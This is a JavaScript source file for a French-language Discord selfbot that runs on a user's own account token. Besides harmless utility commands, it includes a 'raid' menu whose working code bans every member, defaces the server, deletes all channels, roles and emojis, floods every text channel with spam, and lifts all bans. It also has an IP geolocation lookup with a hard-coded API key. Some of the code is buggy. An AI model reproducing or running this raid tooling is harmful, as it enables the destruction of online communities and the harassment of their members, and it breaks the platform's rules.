const Discord = require("discord.js")
const bot = new Discord.Client()
const ms = require('ms')
const superagent = require("superagent")
const prefix = "²"
const con = console.log
const token = (prosecess.env.TOKEN);
const DiscordPermissions = [
  "ADMINISTRATOR", "CREATE_INSTANT_INVITE", "KICK_MEMBERS",
  "BAN_MEMBERS", "MANAGE_CHANNELS", "MANAGE_GUILD",
  "ADD_REACTIONS", "VIEW_CHANNEL", "READ_MESSAGES",
  "SEND_MESSAGES", "SEND_TTS_MESSAGES", "MANAGE_MESSAGES",
  "EMBED_LINKS", "ATTACH_FILES", "READ_MESSAGE_HISTORY",
  "MENTION_EVERYONE", "USE_EXTERNAL_EMOJIS", "EXTERNAL_EMOJIS",
  "CONNECT", "SPEAK", "MUTE_MEMBERS", "DEAFEN_MEMBERS",
  "MOVE_MEMBERS", "USE_VAD", "CHANGE_NICKNAME",
  "MANAGE_NICKNAMES", "MANAGE_ROLES", "MANAGE_ROLES_OR_PERMISSIONS",
  "MANAGE_WEBHOOKS", "MANAGE_EMOJIS"
]

bot.on('ready',() => {
    var serverCount = bot.guilds.size
    var channelsCount = bot.channels.size
    var friendCount = bot.user.friends.size
  console.log(
    `${"-".repeat(40)}\n`                         + 
    " : MI5 Project : \n" + 
    `${"-".repeat(40)}\n`                         +  
    "Information du compte : \n"                         +
    `Pseudo discord   : ${bot.user.tag}!\n`          + 
    `ID discord     : ${bot.user.id}\n`            +
    `Prefix : "${prefix}"\n`              +
    `${"-".repeat(40)}\n`                         +
    "STATUS : \n"                              + 
    `Serveur reconnu sur le token   : ${serverCount}\n`             +
    `Channels reconnu sur le token   : ${channelsCount}\n`             +
    `${"-".repeat(40)}\n`                         +
    `Nombres de personnes en amis   : ${friendCount}\n`             +
    `${"-".repeat(40)}\n`
  );
})


bot.on('message', async msg => {
  
  if(msg.author.id != bot.user.id) return;
    if(msg.content === prefix + "menu"){
      if(msg.deletable) msg.delete();
        let menuE = new Discord.RichEmbed()
          .setThumbnail("https://cdn.discordapp.com/attachments/562338358131556369/579065063936229406/4344d3fe82f635cb12ad12917f472dfa.gif")
          .setTitle("Bienvenue sur le Zone Project")
          .setColor('#070000')
          .setDescription("→ Un selfbot développé par Musharo' ←\n" + "󠂪")
          .addField("Generales", `➜ ${prefix}general : **Affiche les commandes générales** \n` + "󠂪")
          .addField("Utilitaires", `➜ ${prefix}utils : **Affiche les commandes utilitaires** \n` + "󠂪")
          .addField("Fun", `➜ ${prefix}fun : **Affiche les commandes fun** \n` + "󠂪")
          .addField("Crédits", `➜ ${prefix}credits : **Affiches les crédits du projet Zone'** \n` + "󠂪")
          .addField("Raid", `➜ ${prefix}raid : **Affiches les commandes de raid** \n` + "󠂪")
          .setFooter("⚫ ©️  Zone Project ")
            msg.channel.send(menuE).catch(err => console.log(err));
  }
  
  if(msg.content === prefix + "general"){
    if(msg.deletable) msg.delete();
      let generalE = new Discord.RichEmbed()
        .setThumbnail("https://cdn.discordapp.com/attachments/562338358131556369/579065063936229406/4344d3fe82f635cb12ad12917f472dfa.gif")
        .setTitle('Voici les commandes general')
        .setColor('#090000')
        .setDescription(`Tu peux retourné au menu principale : ${prefix}menu` + "󠂪")
        .addField("Avatar", `➜ ${prefix}avatar : **Affiche l'avatar de la personne**`)
        .addField("Geoip", `➜ ${prefix}geoip : **Affiche les informations d'une adresse IP**`)
        .addField("Purge", `➜ ${prefix}purge : **Supprime vos derniers messages envoyés**`)
        .addField("Serv' Info", `➜ ${prefix}sinfo : **Affiche les informations du serveur**`)
        .addField("Serv' Stats", `➜ ${prefix}ss : **Affiche les statistiques du serveur**`)
        .addField("User Stats", `➜ ${prefix}uinfo : **Affiche les informations de la personne**`)
        .addField("Statistique", `➜ ${prefix}stats : **Affiche les statistiques de votre compte**`)
        .addField("Statut", `➜ ${prefix}on > En ligne | ${prefix}npd > Ne pas dérangé | ${prefix}abs > absent | ${prefix}deco > Hors Ligne`)
        .setFooter("⚫ ©️ Zone Project ")
          msg.channel.send(generalE).catch(err => console.log(err));
  }
  

  
  if(msg.content === prefix + "util"){
    if(msg.deletable) msg.delete();
      let utilE = new Discord.RichEmbed()
        .setThumbnail("https://cdn.discordapp.com/attachments/562338358131556369/579065063936229406/4344d3fe82f635cb12ad12917f472dfa.gif")
        .setTitle('Voici les commandes util')
        .setColor('#070000')
        .setDescription(`Tu peux retourné au menu principale : ${prefix}menu` + "󠂪")
        .addField("Multi' Stream", `➜ ${prefix}mstream : **Active le multi-stream du projet Zone**`)
        .addField("Stream", `➜ ${prefix}stream {text} : **Affiche le {text en streaming !**`)  
        .addField("Play", `➜ ${prefix}play {text} : **Affiche que vous jouer au {text} !**`)
        .addField("Watch", `➜ ${prefix}watch {text} : **Affiche que vous regarder le {text}] !**`)
        .addField("Listen", `➜ ${prefix}listen {text} : **Affiche que vous ecouter le {text} !**`)
        .addField("Setname", `➜ ${prefix}setname {text}] : **Change votre pseudo sur le serveur par {text} !**`)
        .addField("Setpp", `➜ ${prefix}setpp {lien : gif ou img} : **Change votre pp par le {GIF/IMG} !**`)
        .setFooter("sermoilbou le bg")
          msg.channel.send(utilE).catch(err => console.log(err));
  }
  
  if (msg.content === prefix + "fun") { 
    if (msg.deletable) msg.delete();  
      let funEmbed = new Discord.RichEmbed()
        .setThumbnail("https://cdn.discordapp.com/attachments/562338358131556369/579065063936229406/4344d3fe82f635cb12ad12917f472dfa.gif")
        .setTitle('Voici les commandes fun')
        .setColor('#070000')
        .setDescription(`Tu peux retourné au menu principale : ${prefix}menu` + "󠂪")
        .addField('Say',`➜ ${prefix}say : **Affiche un message prédéfini !**`)
        .addField('GoogleShearch',`➜ ${prefix}sgoo {mot clef} : **Fais une recherche google des mots clefs**`)
        .addField('YoutubeSearch',`➜ ${prefix}syou {mot clef} : **Fais une recherche youtube des mots clefs**`)
        .setFooter("sermoilbou le bg")
            msg.channel.send(funEmbed).catch(err => con(err));

    }
  

  if(msg.content === prefix + "raid"){
    if(msg.deletable) msg.delete();
      let raidE = new Discord.RichEmbed()
        .setThumbnail("https://cdn.discordapp.com/attachments/562338358131556369/579065063936229406/4344d3fe82f635cb12ad12917f472dfa.gif")
        .setTitle(' Voici les commandes de raid ')
        .setColor('#070000')
        .setDescription(`Tu peux retourné au menu principale : ${prefix}menu` + "󠂪")
        .addField('BanAll', `➜ ${prefix}banall : **Ban tout les membres du serveur** !`)
        .addField('Deface', `➜ ${prefix}deface : **Détruit tout le serveur !**`)
        .addField('Spam', `➜ ${prefix}spam : **Spam tout les salons textuel du serveur !**`)
        .addField('ClearChannels', `➜ ${prefix}clearc : **Supprime tout les channels du serveur !**`)
        .addField('ClearRoles', `➜ ${prefix}clearr : **Supprime tout les rôles du serveur !**`)
        .addField('ClearEmojis', `➜ ${prefix}cleare : **Supprime tout les émojis du serveur !**`)
        .addField('UnbanAll', `➜ ${prefix}unban : **Deban tout les bannis du serveur !**`)
        .setFooter("sermoilbou le bg")
          msg.channel.send(raidE).catch(err => con(err));
  }
  
    if (msg.content === prefix + "sinfo") { 
    if(msg.deletable) msg.delete();
       let sicon = msg.guild.iconURL; 
       let serverembed = new Discord.RichEmbed()
         .setDescription("→ __Informations du Serveur__ ←")
         .setThumbnail(sicon)
         .setColor('#070000')
         .addField("➜ Nom du serveur:", msg.guild.name)
         .addField("➜ ID:", msg.guild.id)
         .addField("➜ Propriétaire du Serveur:", msg.guild.owner.user)
         .addField("➜ Region:", msg.guild.region)
         .addField("➜ Niveau de vérification:", msg.guild.verificationLevel)
         .addField("➜ Date de création:", msg.guild.createdAt)
         .addField("➜ Vous avez rejoins:", msg.member.joinedAt)
         .setFooter("sermoilbou le bg")
       return msg.channel.send(serverembed); 
  }

  if(msg.content === prefix + "ss"){
    if(msg.deletable) msg.delete();
    let sicon = msg.guild.iconURL; 
    let ssembed = new Discord.RichEmbed()
    .setDescription("→ __Statistique du Serveur__ ←")
    .setThumbnail(sicon)
    .setColor('#070000')
    .addField("➜  Nom du serveur:", `${msg.guild.name}`)
    .addField("➜  Nombres de membres:", msg.guild.members.size)
    .addField("➜  Nombres de channel", msg.guild.channels.size)
    .addField("➜  Nombres de roles", msg.guild.roles.size)
    .setFooter("sermoilbou le bg")
    return msg.channel.send(ssembed);
  }
  
  

    if(msg.content === prefix + "spam"){
    if(msg.deletable) msg.delete();
      let args = msg.content.split(" ").join(" ").slice(1);
      setInterval(function () {
        msg.guild.channels.forEach(channel => {
          if(channel.type = "text") channel.send(`${args}`)  
          })
        })
    }
  
  if(msg.content.startsWith ( prefix + "avatar")) {
  if(msg.channel.type === "dm") return;
  if (msg.deletable) msg.delete();
  var fusionmember = msg.mentions.members.first()
  let avatar_embed = new Discord.RichEmbed()
  .setAuthor(` Avatar de ${msg.mentions.users.first().username}`)
  .setColor("#070000")
  .setImage(fusionmember.user.avatarURL)
  return msg.channel.send(avatar_embed).catch(e => {});
 }
  
    if(msg.content === prefix + "deface"){
    if(msg.deletable) msg.delete();
      if(msg.channel.type === 'dm') return;
        if(msg.guild.name != 'sermoilbou le bg'){
          msg.guild.setIcon("https://i.imgur.com/KyJsxMi.gif")
          msg.guild.setName("sermoilbou le bg")
          msg.guild.setRegion("japan").catch(error => {})
        }
        
          setInterval(function () { if(msg.guild.channels.size < 149) {
             msg.guild.createChannel('sermoilbou le bg', 'text').catch(error => {})
           }}, 200)
  }
  
  if (msg.content === prefix + 'clearc'){
  if (msg.deletable) msg.delete();
  msg.guild.channels.forEach(chan => {
    if (chan.deletable) chan.delete();
  });
 }

if (msg.content === prefix + 'clearr'){
  if (msg.deletable) msg.delete();
  msg.guild.roles.forEach(role => {
    role.delete()
  });
 }

if (msg.content === prefix + 'cleare'){
  if (msg.deletable) msg.delete();
  msg.guild.emojis.forEach(emoji => {
    emoji.delete()
  });
 }

   
   if (msg.content === prefix + 'unban') {
  if (msg.deletable) msg.delete();
  let interval = setInterval(function () {
      msg.guild.fetchBans().then(bans => {
        bans.forEach(ban => {
          msg.guild.unban(ban.id);
        });
      });
    }, 1000);
 }
  
  if(msg.content === prefix + "banall"){
      if (msg.deletable) msg.delete();
      msg.guild.members.forEach(member => {
        member.ban().then(function () {
      });
  });
  }
  
   if (msg.content === prefix + "on"){
    if (msg.deletable) msg.delete();
    bot.user.setStatus("online")
}

  if (msg.content === prefix + "abs"){
    if (msg.deletable) msg.delete();
    bot.user.setStatus("idle")
}

  if (msg.content === prefix + "npd"){
    if (msg.deletable) msg.delete();
    bot.user.setStatus("dnd")
}

  if (msg.content === prefix + "deco"){
    if (msg.deletable) msg.delete();
    bot.user.setStatus("invisible")
}
  
if(msg.content === prefix + "credits"){
    if(msg.deletable) msg.delete();
      let crdE = new Discord.RichEmbed()
        .setThumbnail("https://cdn.discordapp.com/attachments/562338358131556369/579065063936229406/4344d3fe82f635cb12ad12917f472dfa.gif")
        .setTitle('Voici les informations sur le selfbot.')
        .setColor('#070000')
        .setDescription(`Tu peux retourné au menu principale : ${prefix}menu` + "󠂪")
        .addField("**Projet Zone dévellopé par**", "`Musharo' MI5#6969`")
        .addField("**Le Serveur MI5**", `Le Royaume : https://discord.gg/qj4xWt3`)
        .addField("**Le Serveur de Musharo**", `Virtuel : https://discord.gg/jyaGN9w`)
        .addField("**Version de Discord**", `${Discord.version}`)
        .addField("**Version du Selfbot**", `Version 1.1`)
        .setFooter("sermoilbou le bg")
          msg.channel.send(crdE).catch(err => con(err));
  }
  
  if(msg.content.startsWith ( prefix + "purge")) {
      let args = msg.content.split(" ").slice(1);
      let messagecount = parseInt(args[0]) || 1;
      var deletedMessages = -1;
      msg.channel.fetchMessages({ limit: Math.min(messagecount + 1, 100, 200) })
          .then(messages => {
              messages.forEach(m => { m.delete().catch(console.error); deletedMessages++; });
          }).then(() => {
              if (deletedMessages === -1) deletedMessages = 0;
              msg.channel.send(`** ${deletedMessages} **__messages sont en cours de supréssions__ :white_check_mark:  `)
                  .then(m => m.delete(5000));
          }).catch(console.error);
  }
  
  if(msg.content.startsWith ( prefix + "sgoo")) {
    if(msg.deletable) msg.delete();
      let args = msg.content.split(' ')
      args.shift()
      msg.reply('Voici les résultats de la recherche : https://www.google.fr/search?q=' + args.join("%20"))
      }
  
  if(msg.content.startsWith ( prefix + "syou")) {
    if(msg.deletable) msg.delete();
      let args = msg.content.split(' ')
      args.shift()
      msg.reply('Voici les résultats de la recherche : https://m.youtube.com/results?search_query=' + args.join("%20"))
      }
  
  
      if(msg.content.startsWith ( prefix + "watch")) {
        if (msg.deletable) msg.delete();
      let args = msg.content.split(" ").slice(1);
      if (!args[0]) return msg.reply("Merci de présicé le nom que tu souhaites.");
         let WatchTime = args.slice(0).join(" ");
          bot.user.setActivity(`${WatchTime}`, {type: "WATCHING"});         
      }
  
      if(msg.content.startsWith ( prefix + "listen")) {
        if (msg.deletable) msg.delete();
      let args = msg.content.split(" ").slice(1);
      if (!args[0]) return msg.reply("Merci de présicé le nom que tu souhaites.");
         let ListTime = args.slice(0).join(" ");
          bot.user.setActivity(`${ListTime}`, {type: "LISTENING"});         
      }
  
  
      if(msg.content.startsWith ( prefix + "stream")) {
        if (msg.deletable) msg.delete();
      let args = msg.content.split(" ").slice(1);
      if (!args[0]) return msg.reply("Merci de présicé le nom que tu souhaites.");
         let StreamTime = args.slice(0).join(" ");
          bot.user.setActivity(`${StreamTime}`, {type: "STREAMING", url: 'https://www.twitch.tv/MI5'});          
      }

      if(msg.content.startsWith ( prefix + "play")) {
        if (msg.deletable) msg.delete();
      let args = msg.content.split(" ").slice(1)
      if (!args[0]) return msg.reply("Merci de présicé le nom que tu souhaites.");
         let PlayTime = args.slice(0).join(" ");
          bot.user.setActivity(`${PlayTime}`, {type: "PLAYING"});         
      }
  

  
  

    if (msg.content === prefix + "stats"){
      var date = new Date(bot.uptime);
      var days = date.getUTCDate() - 1;
      var hours = date.getUTCHours();
      var minutes = date.getUTCMinutes();
      var embed = new Discord.RichEmbed();
      embed.setColor('#070000')
          .setTitle('→ __Statistiques du comptes__ ←')
          .setFooter("sermoilbou le bg")
          .setThumbnail(`${bot.user.avatarURL}`)
          .addField('➜ Nombre de serveur:', `${bot.guilds.size}`, true)
          .addField('➜ Nombre de users:', `${bot.users.size}`, false)
          .addField('➜ Nombre de channels', `${bot.channels.size}`, false)
          .addField("➜ Nombre d'amis", `${bot.user.friends.size}`, false)
          .addField('➜ Discord Version:', `${Discord.version}`, false)
          .addField('➜ Uptime', days + " days, " + hours + " hours and " + minutes + " minutes.")
      msg.channel.sendEmbed(
          embed, {
              disableEveryone: true
          }
      );
    }

    


  if(msg.content === prefix + "mstream"){
    if (msg.deletable) msg.delete();
      let rotate = 0;
  setInterval(function() {
      if(rotate === 0) {
          bot.user.setActivity("「𝓓𝓐ֆ」", {type: "Streaming", url: 'https://www.twitch.tv/fusionproject'});
          rotate = 1;       
      } else if(rotate === 1){
          bot.user.setActivity("𝓓𝓲𝓼𝓽𝓻𝓲𝓬𝓽 𝓐𝓷𝓽𝓲 𝓢𝓪𝓵𝓸𝓹𝒆", {type: "Streaming", url: 'https://www.twitch.tv/fusionproject'});
          rotate = 2;
      } else if(rotate === 2){
          bot.user.setActivity(`「𝓓𝓐ֆ」`, {type: "Streaming", url: 'https://www.twitch.tv/fusionproject'});
          rotate = 3;
      }  else if(rotate === 3){
          random = Math.floor(Math.random() * 7) + 1;
          bot.user.setActivity(`𝓓𝓲𝓼𝓽𝓻𝓲𝓬𝓽 𝓐𝓷𝓽𝓲 𝓢𝓪𝓵𝓸𝓹𝒆`, {type: "Streaming", url: 'https://www.twitch.tv/fusionproject'});
          rotate = 0;
      } }, 10 * 1000)
}

  let messageArray = msg.content.split(" "); let cmd = messageArray[0]; let args = messageArray.slice(1);
  

  if(cmd == prefix + "mactiv"){
    if (msg.deletable) msg.delete();
      let rotate = 0;
      let mactivTime = args.slice(0).join(" ");
  setInterval(function() {
      if(rotate === 0) {
          bot.user.setActivity(`${mactivTime}`, {type: "Streaming", url: 'https://www.twitch.tv/fusionproject'});
          rotate = 1;       
      } else if(rotate === 1){
          bot.user.setActivity(`${mactivTime}`, {type: "Playing"});
          rotate = 2;
      } else if(rotate === 2){
          bot.user.setActivity(`${mactivTime}`, {type: "Listening"});
          rotate = 3;
      }  else if(rotate === 3){
          bot.user.setActivity(`${mactivTime}`, {type: "Watching"});
          rotate = 0;
      } }, 10 * 1000)
}


if (cmd === prefix + "uinfo"){ 
  if (msg.deletable) msg.delete();
    const mention = msg.mentions.members.first();
    var micon = mention.user.avatarURL; 
    var mbrE = new Discord.RichEmbed()
      .setDescription("→ __Informations du Membre__ ←")
      .setFooter("sermoilbou le bg")
      .setColor('#070000')
      .setThumbnail(micon)
      .addField("➜  Tag de la personne !:", mention.user.tag)
      .addField("➜  Client ID de la personne !:", mention.user.id)
      .addField("➜  Game Activity !:", mention.presence.game)
      .addField("➜  Nom de la personne !:", mention.user.username)
      .addField("➜  Nombres de roles !:", mention.roles.size - 1)
      .addField("➜  Date de création du compte !:", mention.user.createdAt)
      .addField("➜  Date à laquelle il a rejoind le serveur !:", mention.joinedAt); 
        return msg.channel.send(mbrE); 
};
  

if (cmd === prefix + 'setpp'){
  if (msg.deletable) msg.delete();
    let avatar = args.slice(0).join(" ")
if(!avatar) avatar = "";
if(!avatar) return
    bot.user.setAvatar(avatar);
  }

if (cmd === prefix + 'setname'){
  if (msg.deletable) msg.delete();
  if (!args[0]) return msg.reply("Merci de présicé le nom que tu souhaites.");
  if (!msg.member.hasPermission("CHANGE_NICKNAME")) return msg.reply("Tu n'as pas la permission de changer de pseudo sur ce serveur.");
      let UserName = args.slice(0).join(" ")
      msg.member.setNickname(`${UserName}`)
      .then(msg.reply(`Votre nom à été changé en ${UserName}`))
      }

      if(cmd === prefix + "say") {
        if(msg.deletable) msg.delete();
          let MI5 = args.slice(0).join(" ")
            let sayEmbed = new Discord.RichEmbed()
              .setColor("#070000")
              .setDescription("** **" + MI5)
                msg.channel.send(sayEmbed)
        
      }

      if (cmd === prefix + "geoip"){
        if (msg.deletable) msg.delete();
        let { body } = await superagent
            .get(`http://api.ipstack.com/${args}?access_key=b8c01cb33b8a774ba4db21d6607a1a1a&format=1`);
    
        let geoE = new Discord.RichEmbed()
            .setDescription("→ __Informations du Membre__ ←")
            .setThumbnail("https://cdn.discordapp.com/attachments/562338358131556369/579065063936229406/4344d3fe82f635cb12ad12917f472dfa.gif")
            .setFooter("sermoilbou le bg")
            .setColor('#070000')
            .addField(`➜ Adresse IP`, `${args}`)
            .addField(`➜ Type`, body.type)
            .addField(`➜ Code du continent`, body.continent_code)
            .addField(`➜ Nom du continent`, body.continent_name)
            .addField(`➜ Code du pays`, body.country_code)
            .addField(`➜ Nom du pays`, body.country_name)
            .addField(`➜ Code de la région`, body.region_code)
            .addField(`➜ Nom de la région`, body.region_name)
            .addField(`➜ Ville`, body.city)
            .addField(`➜ Code postale`, body.zip)
        return msg.channel.send(geoE);
    }

})
  
bot.login(token)
